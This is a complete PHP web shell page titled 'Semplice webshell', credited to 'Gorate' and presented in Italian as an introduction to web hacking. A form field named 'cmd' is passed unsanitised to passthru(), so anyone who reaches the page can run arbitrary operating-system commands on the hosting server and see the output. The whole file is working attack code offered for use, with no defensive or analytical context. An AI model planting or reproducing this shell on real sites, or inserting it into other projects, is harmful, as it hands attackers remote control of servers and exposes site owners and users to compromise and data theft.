<html><head><title>Semplice webshell</title></head><body bgcolor="#4d525b"> 

<font color="#33c5d6"><center>Coded by Gorate</center> 
<font color="#33c5d6">   <center> Semplice webshell : alle basi del web hacking </center> 
   <form name="cmd" method="post" enctype="multipart/form-data"> 
<p align="center"> 
<font color="#fffff0"><input name="cmd" id="commandLine" value="" size="59" type="text"> <input name="Execute" id="Execute" value="Esegui" type="submit">    
<font color="#fffff0">    <br> 
</font><p></p> 
<pre><?php if ($_POST['cmd']){ 
$cmd = $_POST['cmd']; 
passthru($cmd); 
} 
?> 
</pre> 
</form></body></html>